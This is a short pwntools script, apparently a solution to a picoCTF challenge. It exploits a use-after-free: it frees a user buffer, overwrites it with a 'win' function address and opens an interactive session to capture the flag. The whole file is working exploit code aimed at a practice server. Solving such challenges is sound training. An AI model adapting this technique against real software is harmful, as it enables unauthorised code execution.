from pwn import *

r = remote('mercury.picoctf.net', 61817)
#r = process('/tmp/vuln')
#gdb.attach(r,'break *0x8048983')
win_addr = 0x080487d6

# free user buffer
r.sendline(b'I')
r.sendline(b'Y')

# write address to user buffer
r.sendline(b'L')
# fsr you have to wait before sending
#r.sendline(p32(win_addr) + b'a'*4)
r.sendlineafter(b':', p32(win_addr) + b'a'*4)

# get the flag!
r.interactive()

